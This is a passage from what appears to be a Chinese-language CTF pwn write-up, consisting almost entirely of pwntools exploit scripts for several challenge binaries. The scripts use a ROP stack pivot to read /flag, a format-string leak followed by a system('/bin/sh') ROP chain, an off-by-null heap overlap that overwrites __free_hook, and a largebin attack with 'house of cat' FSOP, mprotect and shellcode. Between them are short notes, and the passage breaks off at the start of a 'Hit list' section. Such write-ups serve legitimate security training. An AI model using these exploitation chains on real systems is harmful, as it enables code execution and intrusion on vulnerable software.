class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401713</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401711</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004013cb</span></span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x404100</span>+<span class="number">4</span></span><br><span class="line">bss = <span class="number">0x404130</span>+<span class="number">0x700</span></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(bss + <span class="number">0x50</span>) + p64(<span class="number">0x4013D9</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;Good luck.&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">pd = p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">pd += p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0x4013CD</span>)</span><br><span class="line">pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.sendafter(<span class="string">&quot;Good luck.&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span>+libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x0000000000119431</span>+libc_base</span><br><span class="line"><span class="built_in">open</span> = libc.symbols[<span class="string">&#x27;open&#x27;</span>]+libc_base</span><br><span class="line">read = libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]+libc_base</span><br><span class="line"></span><br><span class="line">pd = p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">pd += p64(pop_rsi) + p64(<span class="number">0x404910</span>)</span><br><span class="line">pd += p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(read) + p64(<span class="number">0x4013CD</span>)</span><br><span class="line">pd = pd.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(<span class="number">0x404810</span>-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.sendafter(<span class="string">&quot;Good luck.&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span> <span class="comment"># 0x404910</span></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">pd += p64(pop_rdi) + p64(<span class="number">0x404910</span>)</span><br><span class="line">pd += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(<span class="built_in">open</span>)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">pd += p64(pop_rdi) + p64(<span class="number">5</span>)</span><br><span class="line">pd += p64(pop_rsi) + p64(<span class="number">0x404a10</span>)</span><br><span class="line">pd += p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(read)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">pd += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">pd += p64(pop_rsi) + p64(<span class="number">0x404a10</span>)</span><br><span class="line">pd += p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pd += p64(write)</span><br><span class="line">pause()</span><br><span class="line">io.send(pd)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0x404910</span>) + p64(leave_ret)</span><br><span class="line">io.sendafter(<span class="string">&quot;Good luck.&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h3 id="format"><a href="#format" class="headerlink" title="format"></a><strong>format</strong></h3><p>这道题和corCTF2024的format-string相似</p><p>原理的话直接看<a href="https://sashactf.gitbook.io/pwn-notes/ctf-writeups/cor-ctf-2024/format-string">https://sashactf.gitbook.io/pwn-notes/ctf-writeups/cor-ctf-2024/format-string</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendlineafter(&quot;n = &quot;,str(0x2000))</span></span><br><span class="line"><span class="comment"># for i in range(0x2000):</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"><span class="comment">#     io.sendlineafter(&quot;type something:&quot;,&quot;%sX&quot;)</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         io.recvuntil(&quot;X&quot;*(i+1))</span></span><br><span class="line"><span class="comment">#         pass</span></span><br><span class="line"><span class="comment">#     except:</span></span><br><span class="line"><span class="comment">#         print(f&quot;found &#123;i&#125; bytes&quot;)</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; found 2981 bytes</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;n = &quot;</span>,<span class="built_in">str</span>(<span class="number">2982</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;type something:&quot;</span>,<span class="string">&quot;%sX&quot;</span>*<span class="number">2982</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x234da5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;n = &quot;</span>,<span class="built_in">str</span>(-<span class="number">0x100</span>)+<span class="string">&quot;\na&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;type something:&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h3 id="Signin2Heap"><a href="#Signin2Heap" class="headerlink" title="Signin2Heap"></a><strong>Signin2Heap</strong></h3><p>程序存在一个off by null漏洞，通过这个实现堆重叠</p><p>glibc2.27可以直接劫持free_hook为system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;choice:&#x27;</span>,p32(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment"># 0-6</span></span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x330</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xa0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Where-is-the-vulnerability"><a href="#Where-is-the-vulnerability" class="headerlink" title="Where is the vulnerability"></a><strong>Where is the vulnerability</strong></h3><p>一道经典的largebin attack + house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(elf.libc.path, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x530</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x540</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment">#0</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x203f50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base + <span class="number">0x1f70f0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi =libc_base + <span class="number">0x000000000010f75b</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000110a4d</span></span><br><span class="line">pop_rdx_leave_ret = libc_base +<span class="number">0x000000000009819d</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000dd237</span></span><br><span class="line">pop_rbp = libc_base + <span class="number">0x0000000000028a91</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002882f</span></span><br><span class="line"></span><br><span class="line">stderr=libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">_IO_list_all = libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">syscall_ret=libc_base + <span class="number">0x98FA6</span> </span><br><span class="line">fake_io_addr = heap_base + <span class="number">0xd00</span></span><br><span class="line">rop_addr = heap_base + <span class="number">0x2750</span></span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_IO_FILE += p64(_flags) #_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext + <span class="number">61</span>) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x68</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x88</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>) <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x30</span>) <span class="comment"># vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span></span><br><span class="line">payload = fake_IO_FILE + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(rop_addr) + p64(ret)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stderr:&quot;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x518</span>) </span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 2</span></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1f70f0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x290</span>) + p64(_IO_list_all-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x540</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x530</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line">rop += p64(pop_rsi) + p64(<span class="number">0x3000</span>) </span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">10</span>)</span><br><span class="line">rop += p64(pop_rbp) + p64(rop_addr + <span class="number">0x48</span>)</span><br><span class="line">rop += p64(pop_rdx_leave_ret) + p64(<span class="number">7</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rsi) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line">rop += p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rbp) + p64(rop_addr + <span class="number">0xa0</span>)</span><br><span class="line">rop += p64(pop_rdx_leave_ret) + p64(<span class="number">0xff</span>)</span><br><span class="line">rop += p64(syscall_ret) + p64(libc_base-<span class="number">0x3000</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x530</span>)</span><br><span class="line">edit(<span class="number">8</span>,rop)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">sc = shellcraft.pushstr(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">sc += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">sc += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br><span class="line">sc += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(asm(sc))</span><br><span class="line"></span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h3 id="Hit-list"><a href="#Hit-list" class="headerlink" title="Hit list"></a><strong>Hit list</strong></h3><p>利用smallbin残留数据泄露堆地址，unsortbin残留数据泄露libc，house of botcake修改_IO_list_all，用house of cat的链子完成getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 